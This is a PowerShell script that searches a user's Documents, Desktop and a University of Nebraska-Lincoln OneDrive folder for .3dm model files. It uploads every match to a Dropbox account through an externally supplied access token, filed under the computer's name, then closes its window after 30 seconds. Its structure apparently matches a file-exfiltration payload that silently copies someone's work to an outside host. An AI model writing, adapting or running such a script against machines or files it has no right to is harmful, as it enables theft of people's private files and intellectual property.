# Force TLS 1.2 for secure connection
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Target locations
$folders = @(
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
)

# Dropbox API setup
$headers = @{
    "Authorization" = "Bearer $db"
    "Content-Type" = "application/json"
}

# Create computer-specific folder
$computer = $env:COMPUTERNAME
$folderArg = @{path="/$computer"; autorename=$true} | ConvertTo-Json
try {
    $null = Invoke-RestMethod -Uri "https://api.dropboxapi.com/2/files/create_folder_v2" -Method Post -Headers $headers -Body $folderArg
} catch {
    Write-Host "Folder exists or connection failed"
}

# File upload function
function Upload-File {
    param($file)
    $uploadHeaders = $headers.Clone()
    $uploadHeaders["Content-Type"] = "application/octet-stream"
    $uploadArgs = @{
        path = "/$computer/$($file.Name)"
        mode = "add"
        autorename = $true
    } | ConvertTo-Json -Compress
    
    $uploadHeaders.Add("Dropbox-API-Arg", $uploadArgs)
    
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
        $null = Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $uploadHeaders -Body $fileBytes
        Write-Host "[âœ“] Uploaded: $($file.Name)" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "[X] Failed: $($file.Name)" -ForegroundColor Red
        return $false
    }
}

# Main execution
Write-Host "Starting 3DM file scan..." -ForegroundColor Yellow
$count = 0

foreach ($folder in $folders) {
    Write-Host "`nScanning: $folder" -ForegroundColor Cyan
    $files = Get-ChildItem -Path $folder -Filter "*.3dm" -Recurse -File -ErrorAction SilentlyContinue
    
    foreach ($file in $files) {
        $count++
        Write-Host "Found: $($file.FullName)" -ForegroundColor Gray
        Upload-File -file $file | Out-Null
    }
}

Write-Host "`nOperation complete! Files processed: $count" -ForegroundColor Yellow
Write-Host "Window will close in 30 seconds..." -ForegroundColor Gray
Start-Sleep -Seconds 30
